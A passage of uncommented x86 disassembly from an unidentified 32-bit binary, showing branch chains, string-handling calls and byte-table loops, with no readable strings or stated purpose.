  4036d4:	bb 06 00 00 00       	mov    $0x6,%ebx
  4036d9:	3b 1c 24             	cmp    (%esp),%ebx
  4036dc:	75 29                	jne    0x403707
  4036de:	52                   	push   %edx
  4036df:	e8 9c a7 00 00       	call   0x40de80
  4036e4:	5a                   	pop    %edx
  4036e5:	50                   	push   %eax
  4036e6:	52                   	push   %edx
  4036e7:	e8 94 a7 00 00       	call   0x40de80
  4036ec:	5a                   	pop    %edx
  4036ed:	50                   	push   %eax
  4036ee:	68 07 00 00 00       	push   $0x7
  4036f3:	e8 42 71 00 00       	call   0x40a83a
  4036f8:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4036fc:	50                   	push   %eax
  4036fd:	e8 be a7 00 00       	call   0x40dec0
  403702:	e9 0d 01 00 00       	jmp    0x403814
  403707:	bb 07 00 00 00       	mov    $0x7,%ebx
  40370c:	3b 1c 24             	cmp    (%esp),%ebx
  40370f:	75 29                	jne    0x40373a
  403711:	52                   	push   %edx
  403712:	e8 69 a7 00 00       	call   0x40de80
  403717:	5a                   	pop    %edx
  403718:	50                   	push   %eax
  403719:	52                   	push   %edx
  40371a:	e8 61 a7 00 00       	call   0x40de80
  40371f:	5a                   	pop    %edx
  403720:	50                   	push   %eax
  403721:	68 06 00 00 00       	push   $0x6
  403726:	e8 0f 71 00 00       	call   0x40a83a
  40372b:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40372f:	50                   	push   %eax
  403730:	e8 8b a7 00 00       	call   0x40dec0
  403735:	e9 da 00 00 00       	jmp    0x403814
  40373a:	bb 08 00 00 00       	mov    $0x8,%ebx
  40373f:	3b 1c 24             	cmp    (%esp),%ebx
  403742:	75 29                	jne    0x40376d
  403744:	52                   	push   %edx
  403745:	e8 36 a7 00 00       	call   0x40de80
  40374a:	5a                   	pop    %edx
  40374b:	50                   	push   %eax
  40374c:	52                   	push   %edx
  40374d:	e8 2e a7 00 00       	call   0x40de80
  403752:	5a                   	pop    %edx
  403753:	50                   	push   %eax
  403754:	68 02 00 00 00       	push   $0x2
  403759:	e8 dc 70 00 00       	call   0x40a83a
  40375e:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403762:	50                   	push   %eax
  403763:	e8 58 a7 00 00       	call   0x40dec0
  403768:	e9 a7 00 00 00       	jmp    0x403814
  40376d:	bb 09 00 00 00       	mov    $0x9,%ebx
  403772:	3b 1c 24             	cmp    (%esp),%ebx
  403775:	75 26                	jne    0x40379d
  403777:	52                   	push   %edx
  403778:	e8 03 a7 00 00       	call   0x40de80
  40377d:	5a                   	pop    %edx
  40377e:	50                   	push   %eax
  40377f:	52                   	push   %edx
  403780:	e8 fb a6 00 00       	call   0x40de80
  403785:	5a                   	pop    %edx
  403786:	50                   	push   %eax
  403787:	68 01 00 00 00       	push   $0x1
  40378c:	e8 a9 70 00 00       	call   0x40a83a
  403791:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403795:	50                   	push   %eax
  403796:	e8 25 a7 00 00       	call   0x40dec0
  40379b:	eb 77                	jmp    0x403814
  40379d:	bb 0a 00 00 00       	mov    $0xa,%ebx
  4037a2:	3b 1c 24             	cmp    (%esp),%ebx
  4037a5:	75 4e                	jne    0x4037f5
  4037a7:	52                   	push   %edx
  4037a8:	e8 d3 a6 00 00       	call   0x40de80
  4037ad:	5a                   	pop    %edx
  4037ae:	50                   	push   %eax
  4037af:	52                   	push   %edx
  4037b0:	e8 cb a6 00 00       	call   0x40de80
  4037b5:	5a                   	pop    %edx
  4037b6:	50                   	push   %eax
  4037b7:	b8 24 70 41 00       	mov    $0x417024,%eax
  4037bc:	50                   	push   %eax
  4037bd:	ff 74 24 10          	push   0x10(%esp)
  4037c1:	e8 8f 5b 00 00       	call   0x409355
  4037c6:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4037ca:	50                   	push   %eax
  4037cb:	e8 f0 a6 00 00       	call   0x40dec0
  4037d0:	8b 54 24 08          	mov    0x8(%esp),%edx
  4037d4:	31 c9                	xor    %ecx,%ecx
  4037d6:	e8 45 19 00 00       	call   0x405120
  4037db:	75 0c                	jne    0x4037e9
  4037dd:	68 01 00 00 00       	push   $0x1
  4037e2:	e8 4b 1d 00 00       	call   0x405532
  4037e7:	eb 0a                	jmp    0x4037f3
  4037e9:	68 00 00 00 00       	push   $0x0
  4037ee:	e8 b6 e7 ff ff       	call   0x401fa9
  4037f3:	eb 1f                	jmp    0x403814
  4037f5:	52                   	push   %edx
  4037f6:	e8 85 a6 00 00       	call   0x40de80
  4037fb:	5a                   	pop    %edx
  4037fc:	50                   	push   %eax
  4037fd:	52                   	push   %edx
  4037fe:	e8 7d a6 00 00       	call   0x40de80
  403803:	5a                   	pop    %edx
  403804:	50                   	push   %eax
  403805:	e8 eb 6f 00 00       	call   0x40a7f5
  40380a:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40380e:	50                   	push   %eax
  40380f:	e8 ac a6 00 00       	call   0x40dec0
  403814:	58                   	pop    %eax
  403815:	8b 54 24 04          	mov    0x4(%esp),%edx
  403819:	52                   	push   %edx
  40381a:	e8 61 a6 00 00       	call   0x40de80
  40381f:	5a                   	pop    %edx
  403820:	50                   	push   %eax
  403821:	52                   	push   %edx
  403822:	e8 f9 a7 00 00       	call   0x40e020
  403827:	58                   	pop    %eax
  403828:	50                   	push   %eax
  403829:	e8 42 19 00 00       	call   0x405170
  40382e:	5a                   	pop    %edx
  40382f:	01 d0                	add    %edx,%eax
  403831:	eb 0a                	jmp    0x40383d
  403833:	e8 78 a8 00 00       	call   0x40e0b0
  403838:	66 c7 00 00 00       	movw   $0x0,(%eax)
  40383d:	ff 74 24 04          	push   0x4(%esp)
  403841:	e8 0a a7 00 00       	call   0x40df50
  403846:	ff 34 24             	push   (%esp)
  403849:	e8 02 a7 00 00       	call   0x40df50
  40384e:	83 c4 08             	add    $0x8,%esp
  403851:	5b                   	pop    %ebx
  403852:	c2 08 00             	ret    $0x8
  403855:	53                   	push   %ebx
  403856:	ba 0c 00 00 00       	mov    $0xc,%edx
  40385b:	83 ec 04             	sub    $0x4,%esp
  40385e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403865:	4a                   	dec    %edx
  403866:	75 f3                	jne    0x40385b
  403868:	e8 53 a7 00 00       	call   0x40dfc0
  40386d:	b8 95 70 41 00       	mov    $0x417095,%eax
  403872:	a3 34 80 41 00       	mov    %eax,0x418034
  403877:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  40387e:	eb 00                	jmp    0x403880
  403880:	b8 08 00 00 00       	mov    $0x8,%eax
  403885:	3b 04 24             	cmp    (%esp),%eax
  403888:	7c 64                	jl     0x4038ee
  40388a:	a1 34 80 41 00       	mov    0x418034,%eax
  40388f:	0f be 00             	movsbl (%eax),%eax
  403892:	89 44 24 04          	mov    %eax,0x4(%esp)
  403896:	ff 05 34 80 41 00    	incl   0x418034
  40389c:	52                   	push   %edx
  40389d:	e8 de a5 00 00       	call   0x40de80
  4038a2:	5a                   	pop    %edx
  4038a3:	50                   	push   %eax
  4038a4:	52                   	push   %edx
  4038a5:	e8 d6 a5 00 00       	call   0x40de80
  4038aa:	5a                   	pop    %edx
  4038ab:	50                   	push   %eax
  4038ac:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  4038b0:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  4038b3:	53                   	push   %ebx
  4038b4:	e8 07 25 00 00       	call   0x405dc0
  4038b9:	8d 44 24 0c          	lea    0xc(%esp),%eax
  4038bd:	50                   	push   %eax
  4038be:	e8 fd a5 00 00       	call   0x40dec0
  4038c3:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4038c7:	52                   	push   %edx
  4038c8:	e8 b3 a5 00 00       	call   0x40de80
  4038cd:	5a                   	pop    %edx
  4038ce:	50                   	push   %eax
  4038cf:	52                   	push   %edx
  4038d0:	e8 4b a7 00 00       	call   0x40e020
  4038d5:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4038d9:	52                   	push   %edx
  4038da:	e8 41 a7 00 00       	call   0x40e020
  4038df:	8d 44 24 10          	lea    0x10(%esp),%eax
  4038e3:	50                   	push   %eax
  4038e4:	e8 d7 a5 00 00       	call   0x40dec0
  4038e9:	ff 04 24             	incl   (%esp)
  4038ec:	71 92                	jno    0x403880
  4038ee:	52                   	push   %edx
  4038ef:	e8 8c a5 00 00       	call   0x40de80
  4038f4:	5a                   	pop    %edx
  4038f5:	50                   	push   %eax
  4038f6:	52                   	push   %edx
  4038f7:	e8 84 a5 00 00       	call   0x40de80
  4038fc:	5a                   	pop    %edx
  4038fd:	50                   	push   %eax
  4038fe:	52                   	push   %edx
  4038ff:	e8 7c a5 00 00       	call   0x40de80
  403904:	5a                   	pop    %edx
  403905:	50                   	push   %eax
  403906:	52                   	push   %edx
  403907:	e8 74 a5 00 00       	call   0x40de80
  40390c:	5a                   	pop    %edx
  40390d:	50                   	push   %eax
  40390e:	68 01 00 00 00       	push   $0x1
  403913:	ff 35 48 80 41 00    	push   0x418048
  403919:	e8 e2 97 00 00       	call   0x40d100
  40391e:	e8 5f 18 00 00       	call   0x405182
  403923:	01 14 24             	add    %edx,(%esp)
  403926:	e8 85 25 00 00       	call   0x405eb0
  40392b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40392f:	50                   	push   %eax
  403930:	e8 8b a5 00 00       	call   0x40dec0
  403935:	52                   	push   %edx
  403936:	e8 45 a5 00 00       	call   0x40de80
  40393b:	5a                   	pop    %edx
  40393c:	50                   	push   %eax
  40393d:	52                   	push   %edx
  40393e:	e8 3d a5 00 00       	call   0x40de80
  403943:	5a                   	pop    %edx
  403944:	50                   	push   %eax
  403945:	52                   	push   %edx
  403946:	e8 35 a5 00 00       	call   0x40de80
  40394b:	5a                   	pop    %edx
  40394c:	50                   	push   %eax
  40394d:	52                   	push   %edx
  40394e:	e8 2d a5 00 00       	call   0x40de80
  403953:	5a                   	pop    %edx
  403954:	50                   	push   %eax
  403955:	68 03 00 00 00       	push   $0x3
  40395a:	ff 35 48 80 41 00    	push   0x418048
  403960:	e8 9b 97 00 00       	call   0x40d100
  403965:	e8 18 18 00 00       	call   0x405182
  40396a:	01 14 24             	add    %edx,(%esp)
  40396d:	e8 3e 25 00 00       	call   0x405eb0
  403972:	8d 44 24 18          	lea    0x18(%esp),%eax
  403976:	50                   	push   %eax
  403977:	e8 44 a5 00 00       	call   0x40dec0
  40397c:	52                   	push   %edx
  40397d:	e8 fe a4 00 00       	call   0x40de80
  403982:	5a                   	pop    %edx
  403983:	50                   	push   %eax
  403984:	52                   	push   %edx
  403985:	e8 f6 a4 00 00       	call   0x40de80
  40398a:	5a                   	pop    %edx
  40398b:	50                   	push   %eax
  40398c:	52                   	push   %edx
  40398d:	e8 ee a4 00 00       	call   0x40de80
  403992:	5a                   	pop    %edx
  403993:	50                   	push   %eax
  403994:	52                   	push   %edx
  403995:	e8 e6 a4 00 00       	call   0x40de80
  40399a:	5a                   	pop    %edx
  40399b:	50                   	push   %eax
  40399c:	68 03 00 00 00       	push   $0x3
  4039a1:	ff 74 24 24          	push   0x24(%esp)
  4039a5:	e8 56 97 00 00       	call   0x40d100
  4039aa:	e8 d3 17 00 00       	call   0x405182
  4039af:	01 14 24             	add    %edx,(%esp)
  4039b2:	e8 f9 24 00 00       	call   0x405eb0
  4039b7:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4039bb:	50                   	push   %eax
  4039bc:	e8 ff a4 00 00       	call   0x40dec0
  4039c1:	52                   	push   %edx
  4039c2:	e8 b9 a4 00 00       	call   0x40de80
  4039c7:	5a                   	pop    %edx
  4039c8:	50                   	push   %eax
  4039c9:	52                   	push   %edx
  4039ca:	e8 b1 a4 00 00       	call   0x40de80
  4039cf:	5a                   	pop    %edx
  4039d0:	50                   	push   %eax
  4039d1:	52                   	push   %edx
  4039d2:	e8 a9 a4 00 00       	call   0x40de80
  4039d7:	5a                   	pop    %edx
  4039d8:	50                   	push   %eax
  4039d9:	52                   	push   %edx
  4039da:	e8 a1 a4 00 00       	call   0x40de80
  4039df:	5a                   	pop    %edx
  4039e0:	50                   	push   %eax
  4039e1:	68 03 00 00 00       	push   $0x3
  4039e6:	ff 74 24 2c          	push   0x2c(%esp)
  4039ea:	e8 11 97 00 00       	call   0x40d100
  4039ef:	e8 8e 17 00 00       	call   0x405182
  4039f4:	01 14 24             	add    %edx,(%esp)
  4039f7:	e8 b4 24 00 00       	call   0x405eb0
  4039fc:	8d 44 24 20          	lea    0x20(%esp),%eax
  403a00:	50                   	push   %eax
  403a01:	e8 ba a4 00 00       	call   0x40dec0
  403a06:	52                   	push   %edx
  403a07:	e8 74 a4 00 00       	call   0x40de80
  403a0c:	5a                   	pop    %edx
  403a0d:	50                   	push   %eax
  403a0e:	52                   	push   %edx
  403a0f:	e8 6c a4 00 00       	call   0x40de80
  403a14:	5a                   	pop    %edx
  403a15:	50                   	push   %eax
  403a16:	52                   	push   %edx
  403a17:	e8 64 a4 00 00       	call   0x40de80
  403a1c:	5a                   	pop    %edx
  403a1d:	50                   	push   %eax
  403a1e:	52                   	push   %edx
  403a1f:	e8 5c a4 00 00       	call   0x40de80
  403a24:	5a                   	pop    %edx
  403a25:	50                   	push   %eax
  403a26:	68 03 00 00 00       	push   $0x3
  403a2b:	ff 74 24 30          	push   0x30(%esp)
  403a2f:	e8 cc 96 00 00       	call   0x40d100
  403a34:	e8 49 17 00 00       	call   0x405182
  403a39:	01 14 24             	add    %edx,(%esp)
  403a3c:	e8 6f 24 00 00       	call   0x405eb0
  403a41:	8d 44 24 24          	lea    0x24(%esp),%eax
  403a45:	50                   	push   %eax
  403a46:	e8 75 a4 00 00       	call   0x40dec0
  403a4b:	52                   	push   %edx
  403a4c:	e8 2f a4 00 00       	call   0x40de80
  403a51:	5a                   	pop    %edx
  403a52:	50                   	push   %eax
  403a53:	68 01 00 00 00       	push   $0x1
  403a58:	ff 74 24 28          	push   0x28(%esp)
  403a5c:	e8 76 02 00 00       	call   0x403cd7
  403a61:	e8 3a 17 00 00       	call   0x4051a0
  403a66:	52                   	push   %edx
  403a67:	e8 14 a4 00 00       	call   0x40de80
  403a6c:	5a                   	pop    %edx
  403a6d:	50                   	push   %eax
  403a6e:	68 00 00 00 00       	push   $0x0
  403a73:	ff 74 24 1c          	push   0x1c(%esp)
  403a77:	e8 5b 02 00 00       	call   0x403cd7
  403a7c:	8d 05 5c 80 41 00    	lea    0x41805c,%eax
  403a82:	50                   	push   %eax
  403a83:	e8 38 a4 00 00       	call   0x40dec0
  403a88:	52                   	push   %edx
  403a89:	e8 f2 a3 00 00       	call   0x40de80
  403a8e:	5a                   	pop    %edx
  403a8f:	50                   	push   %eax
  403a90:	68 00 00 00 00       	push   $0x0
  403a95:	ff 74 24 20          	push   0x20(%esp)
  403a99:	e8 39 02 00 00       	call   0x403cd7
  403a9e:	8d 44 24 28          	lea    0x28(%esp),%eax
  403aa2:	50                   	push   %eax
  403aa3:	e8 18 a4 00 00       	call   0x40dec0
  403aa8:	52                   	push   %edx
  403aa9:	e8 d2 a3 00 00       	call   0x40de80
  403aae:	5a                   	pop    %edx
  403aaf:	50                   	push   %eax
  403ab0:	68 00 00 00 00       	push   $0x0
  403ab5:	ff 74 24 24          	push   0x24(%esp)
  403ab9:	e8 19 02 00 00       	call   0x403cd7
  403abe:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  403ac2:	50                   	push   %eax
  403ac3:	e8 f8 a3 00 00       	call   0x40dec0
  403ac8:	52                   	push   %edx
  403ac9:	e8 b2 a3 00 00       	call   0x40de80
  403ace:	5a                   	pop    %edx
  403acf:	50                   	push   %eax
  403ad0:	68 00 00 00 00       	push   $0x0
  403ad5:	ff 74 24 18          	push   0x18(%esp)
  403ad9:	e8 f9 01 00 00       	call   0x403cd7
  403ade:	8d 44 24 30          	lea    0x30(%esp),%eax
  403ae2:	50                   	push   %eax
  403ae3:	e8 d8 a3 00 00       	call   0x40dec0
  403ae8:	52                   	push   %edx
  403ae9:	e8 92 a3 00 00       	call   0x40de80
  403aee:	5a                   	pop    %edx
  403aef:	50                   	push   %eax
  403af0:	52                   	push   %edx
  403af1:	e8 8a a3 00 00       	call   0x40de80
  403af6:	5a                   	pop    %edx
  403af7:	50                   	push   %eax
  403af8:	52                   	push   %edx
  403af9:	e8 82 a3 00 00       	call   0x40de80
  403afe:	5a                   	pop    %edx
  403aff:	50                   	push   %eax
  403b00:	ff 35 70 80 41 00    	push   0x418070
  403b06:	e8 ef f0 ff ff       	call   0x402bfa
  403b0b:	e8 70 a5 00 00       	call   0x40e080
  403b10:	b8 60 70 41 00       	mov    $0x417060,%eax
  403b15:	50                   	push   %eax
  403b16:	ff 74 24 34          	push   0x34(%esp)
  403b1a:	e8 63 16 00 00       	call   0x405182
  403b1f:	01 54 24 08          	add    %edx,0x8(%esp)
  403b23:	e8 28 2b 00 00       	call   0x406650
  403b28:	8d 44 24 28          	lea    0x28(%esp),%eax
  403b2c:	50                   	push   %eax
  403b2d:	e8 8e a3 00 00       	call   0x40dec0
  403b32:	52                   	push   %edx
  403b33:	e8 48 a3 00 00       	call   0x40de80
  403b38:	5a                   	pop    %edx
  403b39:	50                   	push   %eax
  403b3a:	52                   	push   %edx
  403b3b:	e8 40 a3 00 00       	call   0x40de80
  403b40:	5a                   	pop    %edx
  403b41:	50                   	push   %eax
  403b42:	52                   	push   %edx
  403b43:	e8 38 a3 00 00       	call   0x40de80
  403b48:	5a                   	pop    %edx
  403b49:	50                   	push   %eax
  403b4a:	ff 35 60 80 41 00    	push   0x418060
  403b50:	e8 a5 f0 ff ff       	call   0x402bfa
  403b55:	e8 26 a5 00 00       	call   0x40e080
  403b5a:	b8 2e 70 41 00       	mov    $0x41702e,%eax
  403b5f:	50                   	push   %eax
  403b60:	ff 74 24 34          	push   0x34(%esp)
  403b64:	e8 19 16 00 00       	call   0x405182
  403b69:	01 54 24 08          	add    %edx,0x8(%esp)
  403b6d:	e8 de 2a 00 00       	call   0x406650
  403b72:	8d 44 24 28          	lea    0x28(%esp),%eax
  403b76:	50                   	push   %eax
  403b77:	e8 44 a3 00 00       	call   0x40dec0
  403b7c:	52                   	push   %edx
  403b7d:	e8 fe a2 00 00       	call   0x40de80
  403b82:	5a                   	pop    %edx
  403b83:	50                   	push   %eax
  403b84:	8b 54 24 10          	mov    0x10(%esp),%edx
  403b88:	52                   	push   %edx
  403b89:	e8 f2 a2 00 00       	call   0x40de80
  403b8e:	5a                   	pop    %edx
  403b8f:	50                   	push   %eax
  403b90:	52                   	push   %edx
  403b91:	e8 8a a4 00 00       	call   0x40e020
  403b96:	ba 66 70 41 00       	mov    $0x417066,%edx
  403b9b:	52                   	push   %edx
  403b9c:	e8 7f a4 00 00       	call   0x40e020
  403ba1:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  403ba5:	52                   	push   %edx
  403ba6:	e8 75 a4 00 00       	call   0x40e020
  403bab:	8b 54 24 34          	mov    0x34(%esp),%edx
  403baf:	52                   	push   %edx
  403bb0:	e8 6b a4 00 00       	call   0x40e020
  403bb5:	8b 54 24 30          	mov    0x30(%esp),%edx
  403bb9:	52                   	push   %edx
  403bba:	e8 61 a4 00 00       	call   0x40e020
  403bbf:	e8 bc a4 00 00       	call   0x40e080
  403bc4:	ff 35 40 80 41 00    	push   0x418040
  403bca:	e8 b3 15 00 00       	call   0x405182
  403bcf:	01 54 24 04          	add    %edx,0x4(%esp)
  403bd3:	e8 34 e8 ff ff       	call   0x40240c
  403bd8:	e8 c3 15 00 00       	call   0x4051a0
  403bdd:	31 c0                	xor    %eax,%eax
  403bdf:	ff 74 24 10          	push   0x10(%esp)
  403be3:	e8 68 a3 00 00       	call   0x40df50
  403be8:	ff 74 24 0c          	push   0xc(%esp)
  403bec:	e8 5f a3 00 00       	call   0x40df50
  403bf1:	ff 74 24 1c          	push   0x1c(%esp)
  403bf5:	e8 56 a3 00 00       	call   0x40df50
  403bfa:	ff 74 24 20          	push   0x20(%esp)
  403bfe:	e8 4d a3 00 00       	call   0x40df50
  403c03:	ff 74 24 28          	push   0x28(%esp)
  403c07:	e8 44 a3 00 00       	call   0x40df50
  403c0c:	ff 74 24 18          	push   0x18(%esp)
  403c10:	e8 3b a3 00 00       	call   0x40df50
  403c15:	ff 74 24 2c          	push   0x2c(%esp)
  403c19:	e8 32 a3 00 00       	call   0x40df50
  403c1e:	ff 74 24 14          	push   0x14(%esp)
  403c22:	e8 29 a3 00 00       	call   0x40df50
  403c27:	ff 74 24 08          	push   0x8(%esp)
  403c2b:	e8 20 a3 00 00       	call   0x40df50
  403c30:	ff 74 24 24          	push   0x24(%esp)
  403c34:	e8 17 a3 00 00       	call   0x40df50
  403c39:	83 c4 30             	add    $0x30,%esp
  403c3c:	5b                   	pop    %ebx
  403c3d:	c3                   	ret
  403c3e:	55                   	push   %ebp
  403c3f:	53                   	push   %ebx
  403c40:	31 c0                	xor    %eax,%eax
  403c42:	50                   	push   %eax
  403c43:	e8 78 a3 00 00       	call   0x40dfc0
  403c48:	8b 54 24 10          	mov    0x10(%esp),%edx
  403c4c:	8d 0c 24             	lea    (%esp),%ecx
  403c4f:	e8 0c 14 00 00       	call   0x405060
  403c54:	ff 34 24             	push   (%esp)
  403c57:	ff 35 b8 80 41 00    	push   0x4180b8
  403c5d:	e8 4b 62 00 00       	call   0x409ead
  403c62:	89 c5                	mov    %eax,%ebp
  403c64:	8b 5d 00             	mov    0x0(%ebp),%ebx
  403c67:	83 fb 01             	cmp    $0x1,%ebx
  403c6a:	7d 59                	jge    0x403cc5
  403c6c:	ff 34 24             	push   (%esp)
  403c6f:	ff 35 b8 80 41 00    	push   0x4180b8
  403c75:	e8 33 62 00 00       	call   0x409ead
  403c7a:	89 c5                	mov    %eax,%ebp
  403c7c:	c7 45 00 01 00 00 00 	movl   $0x1,0x0(%ebp)
  403c83:	ff 35 a0 80 41 00    	push   0x4180a0
  403c89:	e8 66 68 00 00       	call   0x40a4f4
  403c8e:	8b 14 24             	mov    (%esp),%edx
  403c91:	52                   	push   %edx
  403c92:	e8 e9 a1 00 00       	call   0x40de80
  403c97:	5a                   	pop    %edx
  403c98:	50                   	push   %eax
  403c99:	52                   	push   %edx
  403c9a:	e8 81 a3 00 00       	call   0x40e020
  403c9f:	8b 2d a4 80 41 00    	mov    0x4180a4,%ebp
  403ca5:	8d 45 0c             	lea    0xc(%ebp),%eax
  403ca8:	50                   	push   %eax
  403ca9:	e8 12 a2 00 00       	call   0x40dec0
  403cae:	ff 35 8c 80 41 00    	push   0x41808c
  403cb4:	58                   	pop    %eax
  403cb5:	89 45 08             	mov    %eax,0x8(%ebp)
  403cb8:	8b 1d 8c 80 41 00    	mov    0x41808c,%ebx
  403cbe:	43                   	inc    %ebx
  403cbf:	89 1d 8c 80 41 00    	mov    %ebx,0x41808c
  403cc5:	31 c0                	xor    %eax,%eax
  403cc7:	ff 34 24             	push   (%esp)
  403cca:	e8 81 a2 00 00       	call   0x40df50
  403ccf:	83 c4 04             	add    $0x4,%esp
  403cd2:	5b                   	pop    %ebx
  403cd3:	5d                   	pop    %ebp
  403cd4:	c2 04 00             	ret    $0x4
  403cd7:	53                   	push   %ebx
  403cd8:	31 c0                	xor    %eax,%eax
  403cda:	50                   	push   %eax
  403cdb:	50                   	push   %eax
  403cdc:	50                   	push   %eax
  403cdd:	50                   	push   %eax
  403cde:	e8 dd a2 00 00       	call   0x40dfc0
  403ce3:	ff 74 24 20          	push   0x20(%esp)
  403ce7:	e8 b4 14 00 00       	call   0x4051a0
  403cec:	8b 54 24 18          	mov    0x18(%esp),%edx
  403cf0:	8d 0c 24             	lea    (%esp),%ecx
  403cf3:	e8 68 13 00 00       	call   0x405060
  403cf8:	68 0a 00 00 00       	push   $0xa
  403cfd:	ff 74 24 04          	push   0x4(%esp)
  403d01:	ff 35 54 80 41 00    	push   0x418054
  403d07:	e8 d0 13 00 00       	call   0x4050dc
  403d0c:	89 44 24 04          	mov    %eax,0x4(%esp)
  403d10:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  403d15:	0f 84 98 00 00 00    	je     0x403db3
  403d1b:	ff 74 24 04          	push   0x4(%esp)
  403d1f:	ff 35 54 80 41 00    	push   0x418054
  403d25:	e8 8e e9 ff ff       	call   0x4026b8
  403d2a:	89 44 24 08          	mov    %eax,0x8(%esp)
  403d2e:	ff 74 24 08          	push   0x8(%esp)
  403d32:	e8 b8 09 00 00       	call   0x4046ef
  403d37:	a3 20 80 41 00       	mov    %eax,0x418020
  403d3c:	ff 35 48 80 41 00    	push   0x418048
  403d42:	ff 35 20 80 41 00    	push   0x418020
  403d48:	ff 74 24 10          	push   0x10(%esp)
  403d4c:	e8 8d d4 ff ff       	call   0x4011de
  403d51:	8b 5c 24 1c          	mov    0x1c(%esp),%ebx
  403d55:	83 fb 01             	cmp    $0x1,%ebx
  403d58:	75 22                	jne    0x403d7c
  403d5a:	a1 20 80 41 00       	mov    0x418020,%eax
  403d5f:	99                   	cltd
  403d60:	52                   	push   %edx
  403d61:	50                   	push   %eax
  403d62:	ff 74 24 10          	push   0x10(%esp)
  403d66:	ff 35 60 80 41 00    	push   0x418060
  403d6c:	e8 8e 09 00 00       	call   0x4046ff
  403d71:	ff 74 24 08          	push   0x8(%esp)
  403d75:	e8 06 5e 00 00       	call   0x409b80
  403d7a:	eb 55                	jmp    0x403dd1
  403d7c:	52                   	push   %edx
  403d7d:	e8 fe a0 00 00       	call   0x40de80
  403d82:	5a                   	pop    %edx
  403d83:	50                   	push   %eax
  403d84:	52                   	push   %edx
  403d85:	e8 f6 a0 00 00       	call   0x40de80
  403d8a:	5a                   	pop    %edx
  403d8b:	50                   	push   %eax
  403d8c:	68 02 00 00 00       	push   $0x2
  403d91:	ff 35 20 80 41 00    	push   0x418020
  403d97:	ff 74 24 18          	push   0x18(%esp)
  403d9b:	e8 10 5f 00 00       	call   0x409cb0
  403da0:	8d 44 24 10          	lea    0x10(%esp),%eax
  403da4:	50                   	push   %eax
  403da5:	e8 16 a1 00 00       	call   0x40dec0
  403daa:	ff 74 24 08          	push   0x8(%esp)
  403dae:	e8 cd 5d 00 00       	call   0x409b80
  403db3:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403db7:	52                   	push   %edx
  403db8:	e8 c3 a0 00 00       	call   0x40de80
  403dbd:	5a                   	pop    %edx
  403dbe:	50                   	push   %eax
  403dbf:	52                   	push   %edx
  403dc0:	e8 5b a2 00 00       	call   0x40e020
  403dc5:	58                   	pop    %eax
  403dc6:	50                   	push   %eax
  403dc7:	e8 a4 13 00 00       	call   0x405170
  403dcc:	5a                   	pop    %edx
  403dcd:	01 d0                	add    %edx,%eax
  403dcf:	eb 0a                	jmp    0x403ddb
  403dd1:	e8 da a2 00 00       	call   0x40e0b0
  403dd6:	66 c7 00 00 00       	movw   $0x0,(%eax)
  403ddb:	ff 34 24             	push   (%esp)
  403dde:	e8 6d a1 00 00       	call   0x40df50
  403de3:	ff 74 24 0c          	push   0xc(%esp)
  403de7:	e8 64 a1 00 00       	call   0x40df50
  403dec:	83 c4 10             	add    $0x10,%esp
  403def:	5b                   	pop    %ebx
  403df0:	c2 08 00             	ret    $0x8
  403df3:	53                   	push   %ebx
  403df4:	ba 0f 00 00 00       	mov    $0xf,%edx
  403df9:	83 ec 04             	sub    $0x4,%esp
  403dfc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403e03:	4a                   	dec    %edx
  403e04:	75 f3                	jne    0x403df9
  403e06:	e8 b5 a1 00 00       	call   0x40dfc0
  403e0b:	b8 9e 70 41 00       	mov    $0x41709e,%eax
  403e10:	a3 34 80 41 00       	mov    %eax,0x418034
  403e15:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  403e1c:	eb 00                	jmp    0x403e1e
  403e1e:	b8 19 00 00 00       	mov    $0x19,%eax
  403e23:	3b 04 24             	cmp    (%esp),%eax
  403e26:	7c 64                	jl     0x403e8c
  403e28:	a1 34 80 41 00       	mov    0x418034,%eax
  403e2d:	0f be 00             	movsbl (%eax),%eax
  403e30:	89 44 24 04          	mov    %eax,0x4(%esp)
  403e34:	ff 05 34 80 41 00    	incl   0x418034
  403e3a:	52                   	push   %edx
  403e3b:	e8 40 a0 00 00       	call   0x40de80
  403e40:	5a                   	pop    %edx
  403e41:	50                   	push   %eax
  403e42:	52                   	push   %edx
  403e43:	e8 38 a0 00 00       	call   0x40de80
  403e48:	5a                   	pop    %edx
  403e49:	50                   	push   %eax
  403e4a:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  403e4e:	6b db ff             	imul   $0xffffffff,%ebx,%ebx
  403e51:	53                   	push   %ebx
  403e52:	e8 69 1f 00 00       	call   0x405dc0
  403e57:	8d 44 24 0c          	lea    0xc(%esp),%eax
  403e5b:	50                   	push   %eax
  403e5c:	e8 5f a0 00 00       	call   0x40dec0
  403e61:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403e65:	52                   	push   %edx
  403e66:	e8 15 a0 00 00       	call   0x40de80
  403e6b:	5a                   	pop    %edx
  403e6c:	50                   	push   %eax
  403e6d:	52                   	push   %edx
  403e6e:	e8 ad a1 00 00       	call   0x40e020
  403e73:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403e77:	52                   	push   %edx
  403e78:	e8 a3 a1 00 00       	call   0x40e020
  403e7d:	8d 44 24 10          	lea    0x10(%esp),%eax
  403e81:	50                   	push   %eax
  403e82:	e8 39 a0 00 00       	call   0x40dec0
  403e87:	ff 04 24             	incl   (%esp)
  403e8a:	71 92                	jno    0x403e1e
  403e8c:	b8 02 71 41 00       	mov    $0x417102,%eax
  403e91:	a3 34 80 41 00       	mov    %eax,0x418034
